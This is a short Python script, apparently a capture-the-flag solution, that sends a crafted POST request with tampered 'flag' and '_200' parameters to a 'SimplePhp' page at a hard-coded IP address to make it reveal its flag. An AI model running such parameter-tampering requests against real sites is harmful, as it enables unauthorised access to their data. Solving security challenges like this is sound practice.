import requests

url    = "http://34.253.165.46/SimplePhp/index.php"
data   = { "flag": "1" }
params = {"_200": "flag"}

r = requests.post(url, data=data, params=params)
print r.content